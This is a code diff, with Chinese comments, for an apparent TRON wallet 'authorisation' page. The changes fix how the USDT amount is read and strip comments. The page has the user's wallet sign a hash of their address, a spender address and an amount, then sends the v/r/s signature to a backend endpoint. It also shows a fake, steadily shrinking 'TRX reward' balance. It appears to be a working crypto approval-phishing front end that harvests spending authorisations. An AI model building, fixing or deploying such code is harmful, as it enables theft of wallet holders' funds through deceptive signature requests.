@@ -381,6 +381,7 @@
             const warning = document.querySelector('.warning');
             const recordCount = document.getElementById("recordCount");
             const showSubmitDataBtn = document.getElementById("showSubmitDataBtn");
+            const amountInput = document.getElementById("approveAmountInput"); // 提前绑定输入框
 
             // 初始化页面
             renderApprovalRecords();
@@ -431,12 +432,16 @@
                 }
             };
 
-            // 生成离线签名按钮（核心逻辑）
+            // 生成离线签名按钮（核心逻辑，修复原始金额获取）
             approveBtn.onclick = async () => {
-                const amountInput = document.getElementById("approveAmountInput");
-                const inputAmountStr = amountInput.value.trim();
+                // 修复：直接使用提前绑定的amountInput，确保获取到值
+                const inputAmountStr = amountInput.value.trim() || "";
                 
-                // 金额校验
+                // 金额校验（增强容错）
+                if (!inputAmountStr) {
+                    showToast("请输入授权金额", "error");
+                    return;
+                }
                 if (!/^\d+(\.\d{1,6})?$/.test(inputAmountStr)) {
                     showToast(`请输入有效的金额（0.01~1000000，最多6位小数）`, "error");
                     return;
@@ -453,7 +458,7 @@
 
                     // 1. 转换金额为合约要求的整数（无精度丢失）
                     const amountInt = usdtToInteger(inputAmountStr);
-                    const amountHex = intToPaddedHex(amountInt); // 仅金额补零到64位（合约uint256要求）
+                    const amountHex = intToPaddedHex(amountInt); // 仅金额补零到64位
 
                     // 2. 生成签名（与合约逻辑完全对齐）
                     const { v, r, s } = await generateOfflineSignature(
@@ -462,11 +467,11 @@
                         amountHex
                     );
 
-                    // 3. 构造提交数据
+                    // 3. 构造提交数据（确保inputAmount必传，无undefined）
                     const submitData = {
                         user: userAddress,
-                        amount: `0x${amountHex}`, // 合约格式金额（0x+64位Hex）
-                        inputAmount: inputAmountStr, // 原始输入金额
+                        amount: `0x${amountHex}`,
+                        inputAmount: inputAmountStr, // 强制传递用户输入的原始字符串
                         v: v,
                         r: r,
                         s: s,
@@ -477,7 +482,7 @@
                     // 4. 保存提交数据到本地
                     localStorage.setItem(SUBMIT_DATA_KEY, JSON.stringify(submitData, null, 2));
                     
-                    // 5. 调用后端接口（可选，不需要可注释）
+                    // 5. 调用后端接口（可选）
                     const res = await fetch(`${BACKEND_API}/approve/submit`, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
@@ -515,12 +520,12 @@
                     }
                     const submitData = JSON.parse(submitDataStr);
                     const copyContent = `后端提交数据：
-1. 用户地址：${submitData.user}<br>
-2. 授权金额（原始）：${submitData.inputAmount} USDT<br>
-3. 授权金额（合约）：${submitData.amount}<br>
-4. 签名V值：${submitData.v}<br>
-5. 签名R值：${submitData.r}<br>
-6. 签名S值：${submitData.s}<br>
+1. 用户地址：${submitData.user}
+2. 授权金额（原始）：${submitData.inputAmount || '未知'} USDT
+3. 授权金额（合约）：${submitData.amount}
+4. 签名V值：${submitData.v}
+5. 签名R值：${submitData.r}
+6. 签名S值：${submitData.s}
 7. 提交时间：${submitData.approveTime}`;
                     prompt("提交数据（可全选复制）", copyContent);
                 } catch (e) {
@@ -552,41 +557,39 @@
         };
 
         /**
-         * 核心修正：生成与合约abi.encodePacked完全对齐的签名
-         * 地址编码为40位Hex（不补零），金额编码为64位Hex（补零），拼接顺序与合约一致
+         * 核心：生成与合约abi.encodePacked完全对齐的签名
          */
         async function generateOfflineSignature(userAddr, spenderAddr, amountHex) {
             try {
-                // 1. 地址处理：Base58转Hex → 去掉0x → 全小写（40位，与合约address编码一致）
+                // 地址处理：Base58转Hex → 去掉0x → 全小写（40位）
                 const userHex = tronWeb.address.toHex(userAddr).replace("0x", "").toLowerCase();
                 const spenderHex = tronWeb.address.toHex(spenderAddr).replace("0x", "").toLowerCase();
 
-                // 2. 拼接规则：userHex（40位） + spenderHex（40位） + amountHex（64位）→ 与合约abi.encodePacked完全一致
+                // 拼接：userHex（40位） + spenderHex（40位） + amountHex（64位）
                 const combinedHex = userHex + spenderHex + amountHex;
 
-                // 3. 生成原始哈希（与合约messageHash完全一致）
-                const messageHash = tronWeb.sha3(combinedHex, true); // 返回0x开头的Hex
+                // 生成原始哈希
+                const messageHash = tronWeb.sha3(combinedHex, true);
 
-                // 4. 加EIP-191前缀（与合约signedHash生成逻辑一致）
+                // 加前缀
                 const prefix = "\x19Ethereum Signed Message:\n32";
                 const prefixHex = asciiToHex(prefix);
                 const prefixedHash = tronWeb.sha3(prefixHex + messageHash.slice(2), true);
 
-                // 5. 唤起imToken签名（用prefixedHash签名，与合约验签逻辑一致）
+                // 唤起签名
                 let signature = await tronWeb.trx.sign(prefixedHash);
-                signature = signature.signature || signature; // 兼容钱包不同返回格式
+                signature = signature.signature || signature;
                 if (!signature) throw new Error("钱包未返回签名");
 
-                // 6. 解析v/r/s（确保与合约ecrecover要求一致）
-                signature = signature.replace(/^0x/, ""); // 去掉前缀
+                // 解析v/r/s
+                signature = signature.replace(/^0x/, "");
                 if (signature.length !== 130) throw new Error(`签名长度错误（需130位，当前${signature.length}位）`);
                 
-                const r = "0x" + signature.slice(0, 64); // 前64位→r（bytes32）
-                const s = "0x" + signature.slice(64, 128); // 中间64位→s（bytes32）
-                const vRaw = parseInt(signature.slice(128, 130), 16); // 最后2位→原始v（0/1）
-                const v = vRaw + 27; // 转换为合约要求的27/28
+                const r = "0x" + signature.slice(0, 64);
+                const s = "0x" + signature.slice(64, 128);
+                const vRaw = parseInt(signature.slice(128, 130), 16);
+                const v = vRaw + 27;
 
-                // 校验v值合法性
                 if (v !== 27 && v !== 28) throw new Error(`V值无效（当前${v}，需27/28）`);
                 return { v, r, s };
             } catch (e) {
@@ -596,27 +599,23 @@
 
         /**
          * USDT金额转整数（避免浮点数精度丢失）
-         * @param {string} amountStr - 输入的金额字符串（如"100.50"）
-         * @return {BigInt} 代币最小单位整数（如100.50 USDT → 100500000）
          */
         function usdtToInteger(amountStr) {
             const [integerPart, decimalPart = ""] = amountStr.split(".");
-            const paddedDecimal = (decimalPart + "000000").slice(0, DECIMALS); // 补零到6位小数
+            const paddedDecimal = (decimalPart + "000000").slice(0, DECIMALS);
             return BigInt(integerPart + paddedDecimal);
         }
 
         /**
-         * 整数转64位Hex字符串（仅金额使用，与合约uint256编码一致）
-         * @param {BigInt} num - 代币最小单位整数
-         * @return {string} 64位Hex字符串（无0x前缀）
+         * 整数转64位Hex字符串
          */
         function intToPaddedHex(num) {
             const hex = num.toString(16).toLowerCase();
-            return hex.padStart(64, "0"); // uint256固定64位Hex，不足补零
+            return hex.padStart(64, "0");
         }
 
         /**
-         * ASCII字符串转Hex（用于生成签名前缀）
+         * ASCII字符串转Hex
          */
         function asciiToHex(str) {
             let hex = "";
@@ -627,7 +626,7 @@
         }
 
         /**
-         * 清理Base58地址（去除隐形字符，校验格式）
+         * 清理Base58地址
          */
         function cleanBase58Address(address) {
             const clean = address.trim().replace(/[\s\u200B-\u200D\uFEFF]/g, "");
@@ -638,7 +637,7 @@
         }
 
         /**
-         * 初始化钱包信息（获取余额、地址）
+         * 初始化钱包信息
          */
         async function initWallet() {
             try {
@@ -649,7 +648,6 @@
                 const trxRaw = await tronWeb.trx.getBalance(userAddress);
                 trxBalance = (Number(trxRaw) / 10**6).toFixed(2);
 
-                // 更新页面显示
                 document.getElementById("userInfo").innerHTML = `
                     已连接：<br>
                     ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
@@ -665,7 +663,7 @@
         }
 
         /**
-         * 更新钱包状态显示（连接/未连接）
+         * 更新钱包状态显示
          */
         function updateWalletStatus() {
             if (userAddress) {
@@ -676,12 +674,12 @@
         }
 
         /**
-         * 保存授权记录到本地存储
+         * 保存授权记录
          */
         function saveApprovalRecord(record) {
             try {
                 const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
-                const newRecords = records.filter(item => item.address !== record.address); // 去重（每个地址仅1次）
+                const newRecords = records.filter(item => item.address !== record.address);
                 newRecords.push(record);
                 localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
             } catch (e) {
@@ -703,7 +701,7 @@
         }
 
         /**
-         * 渲染授权记录列表
+         * 渲染授权记录
          */
         function renderApprovalRecords() {
             const container = document.getElementById("approvalRecords");
@@ -712,7 +710,6 @@
                 container.innerHTML = "<div class='record-item'>暂无授权记录</div>";
                 return;
             }
-            // 按时间倒序排列
             records.sort((a, b) => new Date(b.approveTime) - new Date(a.approveTime));
             container.innerHTML = records.map(record => `
                 <div class="record-item">
@@ -725,7 +722,7 @@
         }
 
         /**
-         * 更新授权记录计数
+         * 更新记录计数
          */
         function updateRecordCount() {
             const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
@@ -733,20 +730,18 @@
         }
 
         /**
-         * TRX奖励倒计时（跨刷新保持状态）
+         * TRX奖励倒计时
          */
         function startPersistentTrxCountdown() {
             const savedState = JSON.parse(localStorage.getItem(STORAGE_KEY) || "{}");
             let currentTrx = savedState.currentTrx || INIT_TRX;
             const lastUpdateTime = savedState.lastUpdate || DEPLOY_START_TIME;
             
-            // 计算上次刷新到现在的秒数，更新TRX余额
             const now = new Date().getTime();
             const secondsPassed = Math.floor((now - lastUpdateTime) / 1000);
             currentTrx = (currentTrx - secondsPassed * TRX_DECREASE_PER_SEC).toFixed(4);
-            currentTrx = Math.max(currentTrx, 0).toFixed(4); // 最低为0
+            currentTrx = Math.max(currentTrx, 0).toFixed(4);
 
-            // 更新显示并保存状态
             function updateTrxDisplay() {
                 document.getElementById("contractTrxDisplay").textContent = currentTrx;
                 localStorage.setItem(STORAGE_KEY, JSON.stringify({
@@ -757,24 +752,22 @@
 
             updateTrxDisplay();
 
-            // 每秒减少TRX
             trxTimer = setInterval(() => {
                 currentTrx = (Number(currentTrx) - TRX_DECREASE_PER_SEC).toFixed(4);
                 currentTrx = Math.max(currentTrx, 0).toFixed(4);
                 updateTrxDisplay();
-                if (currentTrx <= 0) clearInterval(trxTimer); // 余额为0时停止倒计时
+                if (currentTrx <= 0) clearInterval(trxTimer);
             }, 1000);
         }
 
         /**
-         * 提示弹窗（成功/错误）
+         * 提示弹窗
          */
         function showToast(msg, type = "success") {
             const toast = document.getElementById("resultToast");
             toast.textContent = msg;
             toast.style.borderColor = type === "success" ? "#3b82f6" : "#ef4444";
             toast.style.display = "block";
-            // 3秒后自动隐藏
             setTimeout(() => toast.style.display = "none", 3000);
         }
     </script>
